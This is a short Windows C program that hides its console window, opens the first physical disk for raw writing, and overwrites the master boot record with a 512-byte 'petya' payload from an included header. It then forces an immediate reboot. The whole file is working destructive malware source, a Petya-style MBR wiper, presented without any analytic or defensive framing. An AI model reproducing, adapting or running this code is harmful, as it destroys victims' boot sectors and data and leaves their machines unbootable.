#include "mbr_bootsector_petya.h"
#include <Windows.h>
int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	DWORD overwrite0;
	HANDLE Disk0 = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	SetFilePointer(Disk0, 0, NULL, FILE_BEGIN);
	WriteFile(Disk0, petya, 512, &overwrite0, NULL);
	Sleep(6000);
	CloseHandle(Disk0);
	Sleep(4000);
	system("shutdown /r /t 5");
	return 0;
}